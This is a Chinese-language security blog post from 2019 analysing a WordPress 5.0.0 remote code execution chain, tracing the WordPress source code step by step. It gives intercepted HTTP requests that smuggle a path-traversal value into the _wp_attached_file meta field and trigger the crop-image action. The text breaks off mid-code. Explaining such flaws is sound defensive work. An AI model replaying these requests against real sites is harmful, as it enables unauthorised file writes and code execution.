<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="0x01 前言&amp;emsp;&amp;emsp;近期rips在博客上披露了两个关于wordpress的漏洞，一个是WordPress 5.0.0 Remote Code Execution,另一个是WordPress 5.1 CSRF to Remote Code Execution。由于之前工作的原因没有好好看这两个漏洞，所以今天过来学习一下。">
<meta name="keywords" content="php,rce,wordpress">
<meta property="og:type" content="article">
<meta property="og:title" content="聊一聊近期wordpress的漏洞">
<meta property="og:url" content="http://www.lmxspace.com/2019/03/15/聊一聊近期wordpress的漏洞/index.html">
<meta property="og:site_name" content="l1nk3r&#39;s blog">
<meta property="og:description" content="0x01 前言&amp;emsp;&amp;emsp;近期rips在博客上披露了两个关于wordpress的漏洞，一个是WordPress 5.0.0 Remote Code Execution,另一个是WordPress 5.1 CSRF to Remote Code Execution。由于之前工作的原因没有好好看这两个漏洞，所以今天过来学习一下。">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/x9xz2.png">
<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/6ucfl.jpg">
<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/gl8j7.jpg">
<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/ofk0d.png">
<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/uhgsp.png">
<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/p6el1.png">
<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/6izb5.png">
<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/f6dy1.jpg">
<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/1rqhy.jpg">
<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/i79sl.png">
<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/dtyk0.png">
<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/9tkh5.png">
<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/noay9.png">
<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/zbezy.jpg">
<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/l5gr3.png">
<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/3bgqs.jpg">
<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/x1bxu.png">
<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/9bn77.jpg">
<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/i7vl2.jpg">
<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/fbclk.png">
<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/19zne.png">
<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/i2mxr.png">
<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/jsv8c.png">
<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/48h5y.png">
<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/0vckd.png">
<meta property="og:updated_time" content="2019-04-10T04:41:42.952Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="聊一聊近期wordpress的漏洞">
<meta name="twitter:description" content="0x01 前言&amp;emsp;&amp;emsp;近期rips在博客上披露了两个关于wordpress的漏洞，一个是WordPress 5.0.0 Remote Code Execution,另一个是WordPress 5.1 CSRF to Remote Code Execution。由于之前工作的原因没有好好看这两个漏洞，所以今天过来学习一下。">
<meta name="twitter:image" content="http://l1nk3r.xmutsec.com/blog/x9xz2.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>聊一聊近期wordpress的漏洞</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/Friends/">Friends</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2019/03/23/Java-web学习之路-反射机制/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/03/11/Java-web学习之路-序列化和反序列化/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://www.lmxspace.com/2019/03/15/聊一聊近期wordpress的漏洞/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://www.lmxspace.com/2019/03/15/聊一聊近期wordpress的漏洞/&text=聊一聊近期wordpress的漏洞"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://www.lmxspace.com/2019/03/15/聊一聊近期wordpress的漏洞/&title=聊一聊近期wordpress的漏洞"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://www.lmxspace.com/2019/03/15/聊一聊近期wordpress的漏洞/&is_video=false&description=聊一聊近期wordpress的漏洞"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=聊一聊近期wordpress的漏洞&body=Check out this article: http://www.lmxspace.com/2019/03/15/聊一聊近期wordpress的漏洞/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://www.lmxspace.com/2019/03/15/聊一聊近期wordpress的漏洞/&title=聊一聊近期wordpress的漏洞"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://www.lmxspace.com/2019/03/15/聊一聊近期wordpress的漏洞/&title=聊一聊近期wordpress的漏洞"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://www.lmxspace.com/2019/03/15/聊一聊近期wordpress的漏洞/&title=聊一聊近期wordpress的漏洞"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://www.lmxspace.com/2019/03/15/聊一聊近期wordpress的漏洞/&title=聊一聊近期wordpress的漏洞"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://www.lmxspace.com/2019/03/15/聊一聊近期wordpress的漏洞/&name=聊一聊近期wordpress的漏洞&description=&lt;h2 id=&#34;0x01-前言&#34;&gt;&lt;a href=&#34;#0x01-前言&#34; class=&#34;headerlink&#34; title=&#34;0x01 前言&#34;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;近期rips在博客上披露了两个关于wordpress的漏洞，一个是&lt;a href=&#34;https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;WordPress 5.0.0 Remote Code Execution&lt;/a&gt;,另一个是&lt;a href=&#34;https://blog.ripstech.com/2019/wordpress-csrf-to-rce/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;WordPress 5.1 CSRF to Remote Code Execution&lt;/a&gt;。由于之前工作的原因没有好好看这两个漏洞，所以今天过来学习一下。&lt;br&gt;&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-前言"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">0x02 漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、WordPress-5-0-0-Remote-Code-Execution"><span class="toc-number">2.1.</span> <span class="toc-text">一、WordPress 5.0.0 Remote Code Execution</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、变量控制"><span class="toc-number">2.1.1.</span> <span class="toc-text">1、变量控制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、目录穿越"><span class="toc-number">2.1.2.</span> <span class="toc-text">2、目录穿越</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、文件包含"><span class="toc-number">2.1.3.</span> <span class="toc-text">3、文件包含</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、WordPress-5-1-CSRF-to-Remote-Code-Execution"><span class="toc-number">2.2.</span> <span class="toc-text">二、WordPress 5.1 CSRF to Remote Code Execution</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.2.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞修复"><span class="toc-number">2.2.2.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        聊一聊近期wordpress的漏洞
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">l1nk3r's blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2019-03-15T15:12:46.000Z" itemprop="datePublished">2019-03-15</time>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/php/">php</a>, <a class="tag-link" href="/tags/rce/">rce</a>, <a class="tag-link" href="/tags/wordpress/">wordpress</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>&emsp;&emsp;近期rips在博客上披露了两个关于wordpress的漏洞，一个是<a href="https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/" target="_blank" rel="noopener">WordPress 5.0.0 Remote Code Execution</a>,另一个是<a href="https://blog.ripstech.com/2019/wordpress-csrf-to-rce/" target="_blank" rel="noopener">WordPress 5.1 CSRF to Remote Code Execution</a>。由于之前工作的原因没有好好看这两个漏洞，所以今天过来学习一下。<br><a id="more"></a> </p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="一、WordPress-5-0-0-Remote-Code-Execution"><a href="#一、WordPress-5-0-0-Remote-Code-Execution" class="headerlink" title="一、WordPress 5.0.0 Remote Code Execution"></a>一、WordPress 5.0.0 Remote Code Execution</h3><p>&emsp;&emsp;先看第一个漏洞<a href="https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/" target="_blank" rel="noopener">WordPress 5.0.0 Remote Code Execution</a>，这个漏洞是个组合漏洞。<br>&emsp;&emsp;这个漏洞总结起来一共三个步骤。<br>1、控制 <strong>wp_postmeta</strong> 表中的 <strong>meta_key</strong> 与 <strong>meta_value</strong> 的值。<br>2、目录穿越漏洞<br>3、本地文件包含漏洞</p>
<h4 id="1、变量控制"><a href="#1、变量控制" class="headerlink" title="1、变量控制"></a>1、变量控制</h4><p>&emsp;&emsp;首先第一步攻击者可通过控制POST中 <strong>meta_input</strong> 字段的值，从而自由更改 <strong>wp_postmeta</strong> 表中的 <strong>meta_key</strong> 与 <strong>meta_value</strong> 的值，具体效果我们可以看下图。<br>&emsp;&emsp;功能点在媒体添加处，选择添加并且点击更新按钮。<br><img src="http://l1nk3r.xmutsec.com/blog/x9xz2.png" alt=""><br>&emsp;&emsp;过bp拦截抓包，在数据包中增加以下内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /wordpress/wp-admin/post.php HTTP/1.1</span><br><span class="line">Host: 192.168.97.69</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">_wpnonce=44d869d454&amp;_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fpost.php%3Fpost%3D7%26action%3Dedit&amp;user_ID=1&amp;action=editpost...&amp;post_author_override=1&amp;meta_input[_wp_attached_file]=2019/03/1-1.jpg?/../../../../themes/twentynineteen/demo.jpg</span><br></pre></td></tr></table></figure></p>
<p><img src="http://l1nk3r.xmutsec.com/blog/6ucfl.jpg" alt=""><br>&emsp;&emsp;事实上这里相关数据已经进入到了数据库中，接下来可以看看代码究竟是怎么回事。<br><img src="http://l1nk3r.xmutsec.com/blog/gl8j7.jpg" alt=""><br>&emsp;&emsp;从数据包来看当 <strong>action=editpost</strong> ，对应到代码里面的相关位置是在 <strong>wp-admin/post.php</strong> 文件中第196行，这里简化以下代码，我们到看当 <strong>case</strong> 是 <strong>editpost</strong> 的时候，会进入这个 <strong>case</strong> 之内，并且调用 <strong>editpost</strong> 方法，跟进这个方法。<br><img src="http://l1nk3r.xmutsec.com/blog/ofk0d.png" alt=""><br>&emsp;&emsp;这个方法是在 <strong>wp-admin/includes/post.php#edit_post</strong> 中，这里我简化以下代码，我们看一下核心部分。简单来说就是在 <strong>edit_post</strong> 方法中，如果 <strong>post_data</strong> 为空的情况下，是可以通过 <strong>POST</strong> 全局变量获取得到，因此这里的 <strong>post_data</strong> 可控，并且在一系列的代码流程执行结束之后，会调用 <strong>wp_update_post</strong> 方法处理 <strong>post_data</strong> 的值。<br><img src="http://l1nk3r.xmutsec.com/blog/uhgsp.png" alt=""><br>&emsp;&emsp;继续跟进一下 <strong>wp_update_post</strong> 方法,省略了一些无关代码，最后 <strong>return</strong> 的时候会调用 <strong>wp_insert_post</strong> 方法。然后继续跟进 <strong>wp_insert_post</strong> 方法，关键的代码如下图中，对 <code>$postarr[&#39;meta_input&#39;]</code> 做一个遍历，并将键值都带入到 <strong>update_post_meta</strong> 函数中。<br><img src="http://l1nk3r.xmutsec.com/blog/p6el1.png" alt=""><br>&emsp;&emsp;跟进 <strong>update_post_meta</strong> 方法，这个方法中传入的 <strong>meta_key</strong> 和 <strong>meta_value</strong> 都是攻击者可控，且在最后 <strong>return</strong> 时候执行了 <strong>update_metadata</strong> ，而这个方法的作用就是更新 <strong>wp_postmeta</strong> 中数据的内容，所以这里我们可以构造数据数据包，串改相关字段的值。<br><img src="http://l1nk3r.xmutsec.com/blog/6izb5.png" alt=""></p>
<h4 id="2、目录穿越"><a href="#2、目录穿越" class="headerlink" title="2、目录穿越"></a>2、目录穿越</h4><p>&emsp;&emsp;目录穿越文件出现在了剪裁功能上，我们先看一下复现过程。点击编辑图片，使用剪裁功能。<br><img src="http://l1nk3r.xmutsec.com/blog/f6dy1.jpg" alt=""><br>&emsp;&emsp;点击保存之后，通过bp修改数据包，需要将postdata替换为下面这些。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=crop-image&amp;_ajax_nonce=8c2f0c9e6b&amp;id=74&amp;cropDetails[x1]=10&amp;cropDetails[y1]=10&amp;cropDetails[width]=10&amp;cropDetails[height]=10&amp;cropDetails[dst_width]=100&amp;cropDetails[dst_height]=100</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;其中有几点需要注意的是，我们需要将正常剪裁数据包中的<code>_ajax_none</code>和<code>postid</code>的值替换到上面数据包中的<code>_ajax_none</code>和<code>postid</code>的位置。<br><img src="http://l1nk3r.xmutsec.com/blog/1rqhy.jpg" alt=""><br>&emsp;&emsp;然后我们可以看到相关图片已经被目录穿越传递过来了。<br><img src="http://l1nk3r.xmutsec.com/blog/i79sl.png" alt=""><br>&emsp;&emsp;接下来我们来看看代码，首先数据包中的 <strong>postdate</strong> 的 <strong>action=crop—img</strong> ，跟进一下相关代码，也就是在 <strong>wp-admin/admin-ajax.php:99</strong> 位置，通过拼接之后，调用 <strong>do_action</strong> 方法执行 <strong>wp_ajax_crop_img</strong><br><img src="http://l1nk3r.xmutsec.com/blog/dtyk0.png" alt=""><br>&emsp;&emsp;我们跟进一下 <strong>wp_ajax_crop_image</strong> 方法，在这方法中首先通过 <strong>POST</strong> 传入的 <strong>id</strong> 先调用 <strong>check_ajax_referer</strong> 判断 <strong>nonce</strong> 值是否正确，以及是否有相关权限编辑图片，如果前面的流程都正确，会调用 <strong>wp_crop_image</strong> 方法针对data内容进行处理，而 <strong>data</strong> 内容是来自 <strong>POST</strong> 变量 <strong>cropDetails</strong> 的值，因此这部分可控。<br><img src="http://l1nk3r.xmutsec.com/blog/9tkh5.png" alt=""><br>&emsp;&emsp;跟进一下 <strong>wp_crop_image</strong> 方法,这里首先根据传入的 <strong>src</strong> 参数的值判断是否是数字，而这里的 <strong>src</strong> 的值正是通过 <strong>POST</strong> 传入的 <strong>id</strong> 的值，并且调用了 <strong>get_attached_file</strong> 方法，跟进 <strong>get_attached_file</strong> 方法可以看到通过调用 <strong>get_post_meta</strong> 方法根据 <strong>attachment_id</strong> 获取 <strong>meta_key</strong> 值为 <strong>_wp_attached_file</strong> 的 <strong>meta_value</strong> 值查询出来并返回，这里上文已经说过了，我们已经在 <strong>meta_value</strong> 插入了脏数据。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_attached_file</span><span class="params">( $attachment_id, $unfiltered = false )</span> </span>&#123;</span><br><span class="line">	$file = get_post_meta( $attachment_id, <span class="string">'_wp_attached_file'</span>, <span class="keyword">true</span> );</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;然后会进行路径拼接，再会进行 <strong>file_exists</strong> 判断，因为我们传入的是特殊构造的路径，因此 <strong>file_exists</strong> 函数的判断是 <strong>false</strong> ，所以这里进入到了true的循环里，并且调用 <strong>_load_image_to_edit_path</strong> 方法进行处理。跟进 <strong>_load_image_to_edit_path</strong> 方法，由于我们通过第2行<code>get_attached_file( $attachment_id );</code>获取到的路径为特殊路径，因此这里会进入第二循环中，调用 <strong>wp_get_attachment_url</strong> 方法进行路径获取。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wordpress/wp-admin/includes/image.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_load_image_to_edit_path</span><span class="params">( $attachment_id, $size = <span class="string">'full'</span> )</span> </span>&#123;</span><br><span class="line">	$filepath = get_attached_file( $attachment_id );</span><br><span class="line">	<span class="keyword">if</span> ( $filepath &amp;&amp; file_exists( $filepath ) ) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( <span class="string">'full'</span> != $size &amp;&amp; ( $data = image_get_intermediate_size( $attachment_id, $size ) ) ) &#123;</span><br><span class="line">			$filepath = apply_filters( <span class="string">'load_image_to_edit_filesystempath'</span>, path_join( dirname( $filepath ), $data[<span class="string">'file'</span>] ), $attachment_id, $size );</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">elseif</span> ( function_exists( <span class="string">'fopen'</span> ) &amp;&amp; <span class="keyword">true</span> == ini_get( <span class="string">'allow_url_fopen'</span> ) ) &#123;</span><br><span class="line">		$filepath = apply_filters( <span class="string">'load_image_to_edit_attachmenturl'</span>, wp_get_attachment_url( $attachment_id ), $attachment_id, $size );</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> apply_filters( <span class="string">'load_image_to_edit_path'</span>, $filepath, $attachment_id, $size );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;跟进 <strong>wp_get_attachment_url</strong> 方法，通过传入的 <strong>attachment_id</strong> 查询相关 <strong>meta_key</strong> 值为 <strong>_wp_attached_file</strong> 对应 <strong>meta_value</strong> 的值，并且在最后使用<code>$url = $uploads[&#39;baseurl&#39;] . &quot;/$file&quot;;</code>进行URL拼接。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wordpress/wp-includes/post.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_get_attachment_url</span><span class="params">( $attachment_id = <span class="number">0</span> )</span> </span>&#123;</span><br><span class="line">	$attachment_id = (int) $attachment_id;</span><br><span class="line">	<span class="keyword">if</span> ( ! $post = get_post( $attachment_id ) ) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( <span class="string">'attachment'</span> != $post-&gt;post_type )</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">	$url = <span class="string">''</span>;</span><br><span class="line">	<span class="comment">// Get attached file.</span></span><br><span class="line">	<span class="keyword">if</span> ( $file = get_post_meta( $post-&gt;ID, <span class="string">'_wp_attached_file'</span>, <span class="keyword">true</span> ) ) &#123;</span><br><span class="line">		<span class="comment">// Get upload directory.</span></span><br><span class="line">		<span class="keyword">if</span> ( ( $uploads = wp_get_upload_dir() ) &amp;&amp; <span class="keyword">false</span> === $uploads[<span class="string">'error'</span>] ) &#123;</span><br><span class="line">			<span class="comment">// Check that the upload base exists in the file location.</span></span><br><span class="line">			<span class="keyword">if</span> ( <span class="number">0</span> === strpos( $file, $uploads[<span class="string">'basedir'</span>] ) ) &#123;</span><br><span class="line">				<span class="comment">// Replace file location with url location.</span></span><br><span class="line">				$url = str_replace($uploads[<span class="string">'basedir'</span>], $uploads[<span class="string">'baseurl'</span>], $file);</span><br><span class="line">			&#125; <span class="keyword">elseif</span> ( <span class="keyword">false</span> !== strpos($file, <span class="string">'wp-content/uploads'</span>) ) &#123;</span><br><span class="line">				<span class="comment">// Get the directory name relative to the basedir (back compat for pre-2.7 uploads)</span></span><br><span class="line">				$url = trailingslashit( $uploads[<span class="string">'baseurl'</span>] . <span class="string">'/'</span> . _wp_get_attachment_relative_path( $file ) ) . basename( $file );</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="comment">// It's a newly-uploaded file, therefore $file is relative to the basedir.</span></span><br><span class="line">				$url = $uploads[<span class="string">'baseurl'</span>] . <span class="string">"/$file"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;也就是说如果我们数据库里的是:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2019/03/1-1.jpg?/../../../../themes/twentynineteen/demo.jpg</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;上面这这样的url地址，那么拼接之后就如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/wp-content/uploads/2019/03/1-1.jpg?/../../../../themes/twentynineteen/demo.jpg</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;最后会将这部分url还给 <strong>src</strong> 变量，也就是对应 <strong>第13行</strong> 的内容，然后流程会进入到第21行，调用 <strong>wp_get_image_editor</strong> 方法处理src的值。跟进一下 <strong>wp_get_image_editor</strong> 方法,这个方法会调用 <strong>_wp_image_editor_choose</strong> 方法处理传入的 <strong>args</strong> ，这步处理结果是返回一个图片处理方式，下面会细讲。然后通过实例化这个图片处理方式，传入 <strong>path</strong> ，调用图片处理方式中的 <strong>load</strong> 方法，加载相关图片，最后返回实例化的图片处理方式。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wordpress/wp-includes/media.php#wp_get_image_editor</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_get_image_editor</span><span class="params">( $path, $args = array<span class="params">()</span> )</span> </span>&#123;</span><br><span class="line">	$args[<span class="string">'path'</span>] = $path;</span><br><span class="line">	<span class="keyword">if</span> ( ! <span class="keyword">isset</span>( $args[<span class="string">'mime_type'</span>] ) ) &#123;</span><br><span class="line">		$file_info = wp_check_filetype( $args[<span class="string">'path'</span>] );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// If $file_info['type'] is false, then we let the editor attempt to</span></span><br><span class="line">		<span class="comment">// figure out the file type, rather than forcing a failure based on extension.</span></span><br><span class="line">		<span class="keyword">if</span> ( <span class="keyword">isset</span>( $file_info ) &amp;&amp; $file_info[<span class="string">'type'</span>] )</span><br><span class="line">			$args[<span class="string">'mime_type'</span>] = $file_info[<span class="string">'type'</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    $implementation = _wp_image_editor_choose( $args );</span><br><span class="line">    <span class="keyword">if</span> ( $implementation ) &#123;</span><br><span class="line">		$editor = <span class="keyword">new</span> $implementation( $path );</span><br><span class="line">		$loaded = $editor-&gt;load();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ( is_wp_error( $loaded ) )</span><br><span class="line">			<span class="keyword">return</span> $loaded;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> $editor;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;上面我们说到 <strong>_wp_image_editor_choose</strong> 方法的处理结果是返回一个图片处理方式，这里可以跟进一下，代码如下所示，这个方法主要是选择用什么图片库来处理图片，默认两种是Imagick和gd，而在这里是Imagick优先级最高的，GD其次，而这个方法最后的处理结果是返回相关文件方式。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_wp_image_editor_choose</span><span class="params">( $args = array<span class="params">()</span> )</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">	$implementations = apply_filters( <span class="string">'wp_image_editors'</span>, <span class="keyword">array</span>( <span class="string">'WP_Image_Editor_Imagick'</span>, <span class="string">'WP_Image_Editor_GD'</span> ) );</span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span> ( $implementations <span class="keyword">as</span> $implementation ) &#123;</span><br><span class="line">		<span 